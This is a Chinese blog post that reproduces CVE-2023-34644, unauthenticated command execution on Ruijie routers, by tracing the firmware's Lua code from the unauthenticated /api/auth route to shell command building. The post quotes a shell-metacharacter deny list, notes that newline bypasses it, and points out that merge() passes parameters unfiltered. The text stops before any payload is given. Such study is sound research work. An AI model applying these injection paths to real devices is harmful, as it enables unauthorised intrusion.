<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"qwen.cn","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="这是我目前复现的第二个漏洞，也挺难的，我觉得比第一次复现的DIR-815那个更复杂一点，大概花了近一个月的时间,期间很多次因为不同问题或同一个问题停滞。虽然是复现完了，但其实我感觉自己还没有懂透，尤其是逆向分析这部分很少有分析过这么多且复杂的代码，思路也大都是跟着其他师傅文章里的分析往下走的，等多复现几个漏洞后再来看看吧。不过呢，对于这次长达一个月的漏洞复现，还是有不少收获的。">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-34644复现_锐捷未授权命令执行">
<meta property="og:url" content="http://qwen.cn/post/CVE-2023-34644%E5%A4%8D%E7%8E%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="Qwen&#39;s blog">
<meta property="og:description" content="这是我目前复现的第二个漏洞，也挺难的，我觉得比第一次复现的DIR-815那个更复杂一点，大概花了近一个月的时间,期间很多次因为不同问题或同一个问题停滞。虽然是复现完了，但其实我感觉自己还没有懂透，尤其是逆向分析这部分很少有分析过这么多且复杂的代码，思路也大都是跟着其他师傅文章里的分析往下走的，等多复现几个漏洞后再来看看吧。不过呢，对于这次长达一个月的漏洞复现，还是有不少收获的。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272146446.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272145928.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272145915.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144513.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144662.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143942.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144234.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143370.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144357.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144239.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144487.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144001.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143818.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143832.png">
<meta property="article:published_time" content="2025-04-27T13:43:15.000Z">
<meta property="article:modified_time" content="2025-05-02T02:37:56.006Z">
<meta property="article:author" content="Qwen">
<meta property="article:tag" content="IOT安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272146446.png">

<link rel="canonical" href="http://qwen.cn/post/CVE-2023-34644%E5%A4%8D%E7%8E%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CVE-2023-34644复现_锐捷未授权命令执行 | Qwen's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Qwen's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://qwen.cn/post/CVE-2023-34644%E5%A4%8D%E7%8E%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar_2.jpg">
      <meta itemprop="name" content="Qwen">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Qwen's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE-2023-34644复现_锐捷未授权命令执行
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-27 21:43:15" itemprop="dateCreated datePublished" datetime="2025-04-27T21:43:15+08:00">2025-04-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-05-02 10:37:56" itemprop="dateModified" datetime="2025-05-02T10:37:56+08:00">2025-05-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT%E5%AE%89%E5%85%A8/CVE%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">CVE复现</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>12 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>这是我目前复现的第二个漏洞，也挺难的，我觉得比第一次复现的DIR-815那个更复杂一点，大概花了近一个月的时间,期间很多次因为不同问题或同一个问题停滞。虽然是复现完了，但其实我感觉自己还没有懂透，尤其是逆向分析这部分很少有分析过这么多且复杂的代码，思路也大都是跟着其他师傅文章里的分析往下走的，等多复现几个漏洞后再来看看吧。不过呢，对于这次长达一个月的漏洞复现，还是有不少收获的。</p>
<span id="more"></span>

<h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wHkXiHIErOQ9RJUF1gCrlA">https://pan.baidu.com/s/1wHkXiHIErOQ9RJUF1gCrlA</a></p>
<p>提取码: 7d79</p>
<p>直接从官网上下载的固件被加密过，需要对其进行解密，而且我也没有在官网上找到对应的固件🤨可能是因为时间有点久了下架了吧。因此呢，本文用的是已经解密过后的固件，直接用binwalk解压即可。</p>
<h2 id="寻找漏洞文件"><a href="#寻找漏洞文件" class="headerlink" title="寻找漏洞文件"></a>寻找漏洞文件</h2><p>我们要先找到无鉴权的API接口，此类固件的cgi部分通常都是用lua所写的，因此可以直接定位到<code>/usr/lib/lua/luci/controller/eweb/api.lua</code>文件。</p>
<h3 id="api-lua文件"><a href="#api-lua文件" class="headerlink" title="api.lua文件"></a>api.lua文件</h3><p>api.lua文件在<code>/usr/lib/lua/luci/controller/eweb/</code>目录下，该文件的大致结构如下：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.controller.eweb.api&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"><span class="comment">--该行用于定义模块，其全名为luci.controller.eweb.api，</span></span><br><span class="line"><span class="comment">--package.seeall是module的第二个参数设置模块的所有变量和函数为全局可见</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line">    ...           <span class="comment">--luci.controller.eweb.api模块也就是该文件的入口点</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span>  <span class="comment">--认证模块</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_common</span><span class="params">()</span></span>  <span class="comment">--通用模块</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="comment">--各种模块</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">openvpn</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><code>function index()</code>函数中的部分代码如下：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> api = node(<span class="string">&quot;api&quot;</span>) <span class="comment">--定义一个名为 api 的节点 </span></span><br><span class="line">api.sysauth = <span class="string">&quot;admin&quot;</span> <span class="comment">--设置该节点需要的系统认证角色为 admin</span></span><br><span class="line">api.sysauth_authenticator = authenticator <span class="comment">--将 authenticator 函数设置为该节点的认证函数</span></span><br><span class="line">api.notemplate = <span class="literal">true</span> <span class="comment">--设置该节点不使用模板</span></span><br><span class="line"><span class="comment">--定义具体的API路由</span></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;auth&quot;</span>&#125;, call(<span class="string">&quot;rpc_auth&quot;</span>), <span class="literal">nil</span>).sysauth = <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p><code>entry(&#123;&quot;api&quot;, &quot;auth&quot;&#125;, call(&quot;rpc_auth&quot;), nil).sysauth = false</code>表示当用户访问<code>/api/auth</code>路径时，会调用<code>rpc_auth()</code>函数。<code>sysauth</code>是LuCI框架中的一个属性，用于控制该路由是否需要系统认证，这里设置成了false表示不需要系统认证。</p>
<p>rpc_auth()函数：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span></span><br><span class="line">    <span class="comment">-- 加载模块</span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span> <span class="comment">-- _tbl是一个表，加载了模块中的函数作为表中内容</span></span><br><span class="line">    <span class="comment">-- 检查请求体大小</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tonumber</span>(http.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_CONTENT_LENGTH&quot;</span>) <span class="keyword">or</span> <span class="number">0</span>) &gt; <span class="number">1000</span> <span class="keyword">then</span></span><br><span class="line">        http.prepare_content(<span class="string">&quot;text/plain&quot;</span>) <span class="comment">--设置HTTP的响应内容类型为text/plain</span></span><br><span class="line">        <span class="comment">-- http.write(&#123;code = &quot;1&quot;, err = &quot;too long data&quot;&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;too long data&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    <span class="comment">-- 处理 JSON-RPC 请求</span></span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>这一部分会先对HTTP请求头中的<strong>Content_Length</strong>字段也就是请求体的大小进行检查，如果没有超过1000字节便会设置响应内容类型为<strong>application&#x2F;json</strong>，然后处理JSON-RPC请求。<code>ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.write)</code>中<code>http.source()</code>用于读取HTTP请求体中的数据，调用<code>jsonrpc.handle()</code>同时传入参数<code>_tbl</code>和<code>http.source()</code>对数据进行处理，然后将处理后的响应数据写入HTTP响应流中。</p>
<p>因为<code>jsonrpc.handle()</code>和<code>_tbl</code>分别来自<code>luci.utils.jsonrpc</code>和<code>luci.modules.noauth</code>，所以我们还要看看<code>jsonrpc.lua</code>（位于<code>/usr/lib/lua/luci/utils/jsonrpc.lua</code>）和<code>noauth.lua</code>（位于<code>/usr/lib/lua/luci/modules/noauth.lua</code>）这两个文件。</p>
<h3 id="jsonrpc-lua文件"><a href="#jsonrpc-lua文件" class="headerlink" title="jsonrpc.lua文件"></a>jsonrpc.lua文件</h3><p>定位到其handle()函数：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">    <span class="comment">-- 用于将原始的HTTP请求数据传输到一个JSON解码器中，解析成JSON对象，解析成功stat为true</span></span><br><span class="line">    <span class="keyword">local</span> stat, err = luci.ltn12.pump.all(rawsource, decoder:sink())</span><br><span class="line">    <span class="keyword">local</span> json = decoder:get()</span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span> <span class="comment">--检查请求中的method字段是否为字符串,是则执行resolve()函数</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)<span class="comment">--一个包含可调用方法的表（table），这些方法将被JSON-RPC请求调用</span></span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> luci.json.Encoder(response, ...):source()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>这段代码用于处理JSON-RPC请求，具体来说，它处理了请求中的<code>method</code>字段，查找并调用对应的方法，并生成响应。具体过程如下，如果从HTTP请求体中读取的JSON数据解析成功，会检查JSON-RPC请求中的method字段（表示要调用的方法名）是否为字符串(string)。</p>
<p><strong>由此暂可推断出数据报的格式如下：</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>json.method是字符串后，接着看<code>resolve</code>函数，参数<code>method</code>是数据报中的method字段，<strong>mod是传入的<code>tbl</code>（<code>api.lua</code>中的<code>_tbl</code>），<code>tbl</code>是一个表，表中内容为<code>luci.modules.noauth</code>模块里的函数名。</strong></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">(mod, method)</span></span><span class="comment">--mod中有 singleLogin,login,merge,checkNet</span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">path</span> = luci.util.split(method, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j = <span class="number">1</span>, #<span class="built_in">path</span> - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">mod</span> = <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[j])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">mod</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">mod</span> = <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[#<span class="built_in">path</span>]) <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;function&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mod</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><strong><code>resolve</code>函数的作用是根据报文的<code>method</code>字段从<code>mod</code>表中返回一个函数对象，该函数对象有四个选择分别为<code>singleLogin,login,merge,checkNet</code>。</strong></p>
<p><code>resolve</code>函数执行后，接着执行<code>reply</code>函数。由于<code>reply()</code>的参数调用了<code>proxy(method, json.params or &#123;&#125;)</code>，我们先来看<code>proxy</code>函数，这个函数的作用是调用目标方法(<code>method</code>)，也就是<code>json.method</code>，而<code>json.params</code>最终会是目标方法的参数即<code>params</code>。</p>
<h3 id="json-method"><a href="#json-method" class="headerlink" title="json.method"></a>json.method</h3><p>json.method可选值一共有login、singleLogin、merge和checkNet四个函数，其中<code>singleLogin()</code>无参数；<code>checkNet()</code>中<code>params.host</code>是可控的，且其被拼接到了命令执行字符串中，但在此之前<code>tool.checkIp(params.host)</code>会对params.host进行正则匹配检查是否符合IP地址格式。</p>
<p>直接在luci.utils.tool（<code>./usr/lib/lua/luci/utils/tool.lua</code>）中可以看到checkIp()：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkIp</span><span class="params">(str)</span></span></span><br><span class="line">    <span class="comment">-- 放宽IP校验(tipcIp需要)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">len</span>(str) &lt; <span class="number">50</span> <span class="keyword">and</span> <span class="built_in">string</span>.<span class="built_in">match</span>(str, <span class="string">&quot;^[\.%d:%a]+$&quot;</span>) ~= <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h4 id="login"><a href="#login" class="headerlink" title="login()"></a>login()</h4><p>接着分析<code>login()</code>其中有<code>params.password</code>、<code>params.encry</code>和<code>params.limit</code>三个可利用字段，不过也会有<code>tool.includeXxs()</code>对params.password进行检查，然后会调用<code>tool.checkPasswd(checkStat)</code>。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(params)</span></span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span></span><br><span class="line">        tool.eweblog(<span class="string">&quot;INVALID DATA&quot;</span>, <span class="string">&quot;LOGIN FAILED&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">local</span> checkStat = &#123;</span><br><span class="line">        password = params.password,</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span>, <span class="comment">-- params.username,</span></span><br><span class="line">        encry = params.encry,</span><br><span class="line">        limit = params.limit</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>定位到tool.includeXxs()，如下：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">includeXxs</span><span class="params">(str)</span></span></span><br><span class="line">    <span class="keyword">local</span> ngstr = <span class="string">&quot;[`&amp;$;|]&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">match</span>(str, ngstr) ~= <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>可知，<code>tool.includeXxs(params.password)</code>会对<code>params.password</code>进行一些与命令执行有关的危险字符过滤，但<strong>没有过滤<code>\n</code>这个命令分隔符</strong>。</p>
<p>继续定位到tool.checkPasswd()，如下：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPasswd</span><span class="params">(checkStat)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> _data = &#123;</span><br><span class="line">        <span class="built_in">type</span> = checkStat.encry <span class="keyword">and</span> <span class="string">&quot;enc&quot;</span> <span class="keyword">or</span> <span class="string">&quot;noenc&quot;</span>,<span class="comment">--checkStat.encry为true则type为enc,为flase则type为noenc</span></span><br><span class="line">        password = checkStat.password,</span><br><span class="line">        name = checkStat.username,</span><br><span class="line">        limit = checkStat.limit <span class="keyword">and</span> <span class="string">&quot;true&quot;</span> <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> _check = cmd.devSta.get(&#123;<span class="built_in">module</span> = <span class="string">&quot;adminCheck&quot;</span>, device = <span class="string">&quot;pc&quot;</span>, data = _data&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(_check) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> _check.result == <span class="string">&quot;success&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>, _check.reason</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>可知，在<code>_data</code>表中<code>type</code>和<code>limit</code>会根据params.encry和params.limit的值被赋予固定的字符串，<code>name</code>也是一个固定值为<code>admin</code>，此时便只剩<code>password</code>即params.password这一个可控参数。然后继续调用<code>cmd.devSta.get()</code>进行操作。</p>
<p>定位到cmd.devSta.get()（位于<code>./usr/lib/lua/luci/modules/cmd.lua</code>）：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> opt = &#123;<span class="string">&quot;add&quot;</span>, <span class="string">&quot;del&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;clear&quot;</span>, <span class="string">&#x27;doc&#x27;</span>&#125;</span><br><span class="line">acConfig, devConfig, devSta, devCap = &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, #opt <span class="keyword">do</span></span><br><span class="line">    ...</span><br><span class="line">    devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>在cmd.devSta.get()中会通过<code>doParams</code>函数对传入的<code>Json</code>参数进行解析，将其中的<code>data</code>等字段分离出来，传入<code>fetch</code>函数做进一步处理。</p>
<blockquote>
<p>而<code>doParams</code>函数中对<code>data</code>字段进行提取的时候，用到了<code>luci.json.encode</code>函数。这里的<code>data</code>字段就是上述<code>checkPasswd</code>函数中传入<code>devSta.get</code>作为<code>Json</code>参数的<code>_data</code>的内容，我们的疑似注入点<code>password</code>字段就在其中。<strong>此处的<code>luci.json.encode</code>函数会对<code>\n</code>（即<code>\u000a</code>）类字符进行转义，也就不会被解析成换行符了</strong>，不论我们后续再如何传参，这个疑似的漏洞点已经被封堵住了。</p>
</blockquote>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> params.data <span class="keyword">then</span></span><br><span class="line">    data = luci.json.encode(params.data)</span><br><span class="line">    _shell = _shell .. <span class="string">&quot; &#x27;&quot;</span> .. data .. <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h4 id="merge"><a href="#merge" class="headerlink" title="merge()"></a>merge()</h4><p>这个函数很简单，就调用了<code>cmd.devSta.set()</code>，且整个<code>merge.params</code>(<code>json.params</code>)参数都可控制也无任何过滤。</p>
